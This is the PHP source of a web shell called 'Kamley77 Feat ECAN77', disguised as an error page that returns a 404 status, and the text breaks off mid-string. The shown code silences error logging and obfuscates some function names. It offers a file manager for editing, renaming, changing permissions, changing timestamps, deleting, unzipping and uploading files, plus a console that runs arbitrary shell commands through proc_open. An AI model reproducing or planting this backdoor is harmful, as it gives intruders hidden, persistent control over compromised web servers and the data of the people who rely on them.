<?php
date_default_timezone_set('Asia/Jakarta');
?>
<!DOCTYPE html>
<html>

<head>
    <title>KAMLEY77 ECAN77</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="author" content="KAMLEY77">
    <meta name="viewport" content="1337" />
    <meta name="description" content="Error Page">
    <meta property="og:description" content="Error Page">
    <meta property="og:image" content="#">
    <meta name="robots" content="noindex">
    <meta name="googlebot" content="noindex">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Carrois+Gothic&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Bungee+Outline&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

<body>

    <style>
        @import url("https://fonts.googleapis.com/css?family=Dosis");
        @import url("https://fonts.googleapis.com/css?family=Carrois+Gothic");
        @import url("https://fonts.googleapis.com/css?family=Bungee+Outline");

        body {
            font-family: "Dosis", cursive;
            color: #fff;
            text-shadow: 0px 0px 1px #757575;
            background-color: #212529;
            background-size: cover;
            background-attachment: fixed;
            background-repeat: no-repeat;
            background-size: 7%, 7%;
            background-position: right bottom, left bottom;
        }

        .directory-listing-table {
            margin: auto;
            background-color: #212529;
            padding: .7rem 1rem;
            max-width: 900px;
            width: 100%;
            box-shadow: 0 0 20px black;
            border: 1px solid #40BECC;
        }

        .header {
            margin: auto;
            background-color: #212529;
            padding: .7rem 1rem;
            max-width: 100%;
            width: 100%;
            box-shadow: 0 0 20px black;
            border-bottom: 1px solid #40BECC;
        }

        th {
            border-top: 1px solid #fff;
            border-bottom: 1px solid #fff;
        }

        tbody td {
            font-size: 13px;
            padding: 0.5rem;
            color: #fff;
            font-weight: 400;
            font-family: "Roboto", "Poppins", sans-serif;
        }

        tbody td a {
            text-decoration: none;
            color: #fff;
        }

        tbody td:not(:first-child) {
            text-align: center;
        }

        body::-webkit-scrollbar {
            width: 14px;
        }

        body::-webkit-scrollbar-track {
            background: #000;
        }

        body::-webkit-scrollbar-thumb {
            background-color: #212529;
            border: 3px solid #000;
        }

        input {
            margin-bottom: 4px;
            background: rgba(0, 0, 0, 0.3);
            border: none;
            outline: none;
            padding: 5px;
            font-size: 15px;
            color: #fff;
            text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(0, 0, 0, 0.3);
            border-radius: 14px;
            box-shadow: inset 0 -5px 45px rgba(100, 100, 100, 0.2), 0 1px 1px rgba(255, 255, 255, 0.2);
            -webkit-transition: box-shadow .5s ease;
            -moz-transition: box-shadow .5s ease;
            -o-transition: box-shadow .5s ease;
            -ms-transition: box-shadow .5s ease;
            transition: box-shadow .5s ease;
        }

        textarea {
            max-width: 100%;
            max-height: 100%;
            padding-left: 2px;
            resize: none;
            overflow: auto;
            color: #fff;
            text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(0, 0, 0, 0.3);
            border-radius: 4px;
            box-shadow: inset 0 -5px 45px rgba(100, 100, 100, 0.2), 0 1px 1px rgba(255, 255, 255, 0.2);
            -webkit-transition: box-shadow .5s ease;
            -moz-transition: box-shadow .5s ease;
            -o-transition: box-shadow .5s ease;
            -ms-transition: box-shadow .5s ease;
            transition: box-shadow .5s ease;
            background: rgba(0, 0, 0, 0.3);
        }

        .badge-action-edit:hover::after {
            content: "Edit"
        }

        .badge-action-rename:hover::after {
            content: "Rename"
        }

        .badge-action-chmod:hover::after {
            content: "Chmod"
        }

        .badge-action-delete:hover::after {
            content: "Delete"
        }

        .badge-action-download:hover::after {
            content: "Download"
        }

        .badge-action-unzip:hover::after {
            content: "UnZip"
        }

        .badge-action-tanggal:hover::after {
            content: "ChDate"
        }

        .badge-action-unzip:hover::after,
        .badge-action-download:hover::after,
        .badge-action-delete:hover::after,
        .badge-action-chmod:hover::after,
        .badge-action-rename:hover::after,
        .badge-action-tanggal:hover::after,
        .badge-action-edit:hover::after {
            padding: 5px;
            border-radius: 10px;
            margin-left: -40px;
            color: #40BECC;
            border: 2px solid #40BECC;
            background-color: #212529;
        }

        .badge-action-unzip:hover::after,
        .badge-action-download:hover::after,
        .badge-action-delete:hover::after,
        .badge-action-chmod:hover::after,
        .badge-action-rename:hover::after,
        .badge-action-tanggal:hover::after,
        .badge-action-edit:hover::after {
            width: 68px;
            text-align: center;
            margin-top: -53px;
            display: block;
            position: absolute;
            font-size: 14px;
        }

        textarea::-webkit-scrollbar {
            width: 12px;
        }

        textarea::-webkit-scrollbar-track {
            background: #000000;
        }

        textarea::-webkit-scrollbar-thumb {
            background-color: #212529;
            border: 3px solid black;
        }

        a {
            color: #fff;
            text-decoration: none;
        }

        a:hover {
            color: #999797;
            text-shadow: 0px 0px 2 0px #ED360E;
        }

        input,
        select,
        textarea {
            border: 1px #000000 solid;
            -moz-border-radius: 5px;
            -webkit-border-radius: 5px;
            border-radius: 5px;
        }

        select:after {
            cursor: pointer;
        }

        .pencet {
            background-color: rgb(0 0 0 / 57%);
            color: #fff;
            border-color: blanchedalmond;
        }

        .crot {
            border-radius: 50%;
            padding: 15px;
            width: 100px;
            height: 100px;
        }

        .d7net-text {
            font-size: 19pt;
            font-family: "Carrois Gothic", cursive;
            color: #fff;
            text-align: center;
            background: linear-gradient(200deg, #000000 25%, #ffffff 50%, #ffffff 75%, #ffffff 100%);
            background-size: 200% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: animate 1.2s linear infinite;
        }

        @keyframes animate {
            to {
                background-position: 200% center;
            }
        }

        body,
        a,
        button:link {
            cursor: url(http://4.bp.blogspot.com/-hAF7tPUnmEE/TwGR3lRH0EI/AAAAAAAAAs8/6pki22hc3NE/s1600/ass.png),
                default;
        }

        button:hover {
            cursor: url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),
                wait;
        }

        a:hover {
            cursor: url(http://3.bp.blogspot.com/-bRikgqeZx0Q/TwGR4MUEC7I/AAAAAAAAAtA/isJmS0r35Qw/s1600/pointer.png),
                wait;
        }
    </style>
    </td>
    <script>
        function myFunction() {
            var copyText = document.getElementById("myInput");
            copyText.select();
            copyText.setSelectionRange(0, 99999); // For mobile devices
            navigator.clipboard.writeText(copyText.value);
            alert("Copied Successfully!!");
        }
    </script>
    <?php
    error_reporting(0);
    set_time_limit(0);
    @clearstatcache();
    @ini_set('error_log', null);
    @http_response_code(404);
    $web = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://" . $_SERVER['HTTP_HOST'];
    $disfunc = @ini_get("disable_functions");
    if (empty($disfunc)) {
        $disf = "<font color='lime'>YES</font>";
    } else {
        $disf = "<font color='red'>" . $disfunc . "</font>";
    }
    function author()
    {
        echo "</div><table class='directory-listing-table'><td><center><font face='carrois gothic' size='3px'>2017 &copy; Kamleyy | Hmei7 </center></td></table><br>";
        exit();
    }

    function cekdir()
    {
        if (isset($_GET['path'])) {
            $serlok = $_GET['path'];
        } else {
            $serlok = getcwd();
        }
        if (is_writable($serlok)) {
            return "<font color='lime'>yes</font>";
        } else {
            return "<font color='red'>not</font>";
        }
    }

    function cekroot()
    {
        if (is_writable($_SERVER['DOCUMENT_ROOT'])) {
            return "<font color='lime'>YES</font>";
        } else {
            return "<font color='red'>NO!</font>";
        }
    }
    function d7net_ex($file)
    {
        $pile = $file;
        $pch = pathinfo($pile, PATHINFO_FILENAME);
        return $pch;
    }

    function xrmdir($dir)
    {
        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') {
                continue;
            }
            $path = $dir . '/' . $item;
            if (is_dir($path)) {
                xrmdir($path);
            } else {
                unlink($path);
            }
        }
        rmdir($dir);
    }
    function net($hexnet)
    {
        for ($i = 0; $i < strlen($hexnet); $i++) {
            $d7net .= dechex(ord($hexnet[$i]));
        }
        return $d7net;
    }
    function owner($file)
    {
        if (function_exists("posix_getpwuid")) {
            $tod = @posix_getpwuid(fileowner($file));
            return "<center>" . $tod['name'] . "</center>";
        } else {
            return "<center>" . fileowner($file) . "</center>";
        }
    }

    function cekwrite($serlok)
    {
        $izin = substr(sprintf('%o', fileperms($serlok)), -4);
        if (is_writable($serlok)) {
            return "<font color=lime>" . $izin . "</font>";
        } else {
            return "<font color=red>" . $izin . "</font>";
        }
    }
    function cmd($gas, $serlok)
    {
        $crot = $gas;
        $pr = "proc_open";
        if (function_exists($pr)) {
            $tod = @proc_open($crot, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $serlok);
            echo "" . stream_get_contents($crottz[1]) . "</textarea></center><br>";
        } else {
            echo "<font color='orange'></font>";
        }
    }
    function ekse($coman, $serlok)
    {
        $ler = "2>&1";
        if (!preg_match("/" . $ler . "/i", $coman)) {
            $coman = $coman . " " . $ler;
        }
        $komen = $coman;
        $pr = "proc_open";
        if (function_exists($pr)) {
            $tod = @$pr($komen, array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "r")), $crottz, $serlok);
            echo "<pre><textarea rows='25' style='color:lime;' readonly='' cols='120px'>
    " . htmlspecialchars(stream_get_contents($crottz[1])) . "</textarea></pre><br>";
        } else {
            echo "<font color='orange'>proc_open function is disabled!!</font>";
        }
    }
    function ipserv()
    {
        if (empty($_SERVER['SERVER_ADDR'])) {
            return gethostbyname($_SERVER['SERVER_NAME']);
            if (empty(gethostbyname($_SERVER['SERVER_NAME']))) {
                return $_SERVER['SERVER_NAME'];
            }
        } else {
            return $_SERVER['SERVER_ADDR'];
        }
    }

    function cekfile($file)
    {
        return '<i class="fa fa-file-code-o" style="font-size:17px;color:#456DEB;"></i>';
    }
    function filedate($file)
    {
        return date("F d Y g:i:s", filemtime($file));
    }
    function fext($file)
    {
        $sub = "\163\x75" . "\142\x73" . "\x74\x72";
        return $sub(strrchr($file, '.'), 1);
    }
    function gazz($file)
    {
        $fbiasa = array("php", "phtml", "shtml", "phar", "php7", "html", "htm", "inc", "phps", "txt", "js", "css", "htaccess", "bin", "pl", "py", "sh", "php58", "PhP7", "aspx", "dll", "ini");
        $notf = array("jpeg", "jpg", "png", "gif", "ico", "webp", "mp3", "m4A", "flac", "wav", "wma", "3gp", "ogg", "webm", "mp4", "exe");
        $stl = "\x73\x74" . "\162\164" . "\157\154\x6f" . "\167\x65\162";
        $ext = $stl(fext($file));
        if ($file == 'error_log') {
            return "
<button type='submit' class='btn btn-outline-secondary badge-action-edit' name='pilih' value='edit'>
<i class='fa fa-edit' style='color: #36F239'></i></button>
<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil' style='color: #fff'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear' style='color: #06D2D5'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar' style='color: #4542F9'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash' style='color: #E53A3A'></i></button>
<button type='submit' class='btn btn-outline-secondary badge-action-unzip' name='pilih' value='unzip'>
<i class='fa fa-file-archive-o' style='color: #F1BE0F'></i></button>";
        } elseif (in_array($ext, $fbiasa)) {
            return "
<button type='submit' class='btn btn-outline-secondary badge-action-edit' name='pilih' value='edit'>
<i class='fa fa-edit' style='color:#7AFF41'></i></button>
<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil'></i></button>
<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear'></i></button>
<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar'></i></button>
<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash'></i></button>";
        } elseif (in_array($ext, $notf)) {
            return "
<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil'></i></button>
<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear'></i></button>
<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar'></i></button>
<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash'></i></button>";
        } elseif ($ext == 'zip') {
            return "
<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil'></i></button>
<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear'></i></button>
<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar'></i></button>
<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash'></i></button>
<button type='submit' class='btn btn-outline-warning badge-action-unzip' name='pilih' value='unzip'>
<i class='fa fa-file-archive-o'></i></button>";
        } else {
            return "
<button type='submit' class='btn btn-outline-secondary badge-action-edit' name='pilih' value='edit'>
<i class='fa fa-edit' style='color:#7AFF41'></i></button>
<button type='submit' class='btn btn-outline-light badge-action-rename' name='pilih' value='gantinama'>
<i class='fa fa-pencil'></i></button>
<button type='submit' class='btn btn-outline-info badge-action-chmod' name='pilih' value='chmod'>
<i class='fa fa-gear'></i></button>
<button type='submit' class='btn btn-outline-primary badge-action-tanggal' name='pilih' value='chdate'>
<i class='fa fa-calendar'></i></button>
<button type='submit' class='btn btn-outline-danger badge-action-delete' name='pilih' value='hapus'>
<i class='fa fa-trash'></i></button>";
        }
    }

    function unzip($file, $serlok)
    {
        if (!is_readable($file)) {
            red("<table class='directory-listing-table' style='color:orange;'><thead><td><font color='orange'>Cannot Unzip File / Unreadable File !</font></td></thead></table>");
            die();
        } elseif (strpos(file_get_contents($file), "\x50\x4b\x03\x04") === false) {
            echo "<table class='directory-listing-table' style='border-color:red;'><td><font color='red'><center><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> This isn't Zip File</center></font></td></table>";
            die();
        }
        $zip = new ZipArchive;
        $res = $zip->open($file);
        if ($res == true) {
            $zip->extractTo($serlok);
            $zip->close();
            echo "<table class='directory-listing-table' style='border-color:lime;'> <td>Unzip File Successfully => <font color='lime'>" . basename($_POST['path']) . "</font><br>
        Extract to : <font color='aqua'>" . $file . "</font></td></thead</table>";
        } else {
            echo "<table class='directory-listing-table' style='border-color:red;'><td><i class='fa fa-exclamation-triangle' aria-hidden='true'></i> Failed to Unzip File!!</font></td></table>";
        }
        exit();
    }
    foreach ($_POST as $key => $value) {
        $_POST[$key] = stripslashes($value);
    }

    if (isset($_GET['path'])) {
        $serlok = $_GET['path'];
        $serlok2 = $_GET['path'];
    } else {
        $serlok = getcwd();
        $serlok2 = getcwd();
    }

    $serlok = str_replace('\\', '/', $serlok);
    $serloks = explode('/', $serlok);
    $serlokbos = @scandir($serlok);


    echo '<table class="header"><td><center>
    <div style="font-family:Bungee Outline;font-size:24px;"><a href="' . $_SERVER['SCRIPT_NAME'] . '"><i class="fa-brands fa-napster"></i> Kamley77 Feat ECAN77</a></center></div></td><td>';
    echo '<table align="center"><td>
<div class="btn-group me-2" role="group" aria-label="First group">
<button type="button" onclick=location.href="' . $_SERVER['SCRIPT_NAME'] . '" class="btn btn-outline-light"><font color="aqua"><i class="fa fa-home"></i> Home</font></button>
<div class="btn-group me-2" role="group" aria-label="First group">
<button type="button" onclick=location.href="?path=' . $serlok . '&' . net("cmd") . '=opet" class="btn btn-outline-light"><i class="fa fa-terminal"></i> Console</button>';

    echo '<button type="button" onclick=location.href="?path=' . $serlok . '&' . net("upload") . '=opet" class="btn btn-outline-light"><i class="fa fa-upload"></i> Upload</button>

<button type="
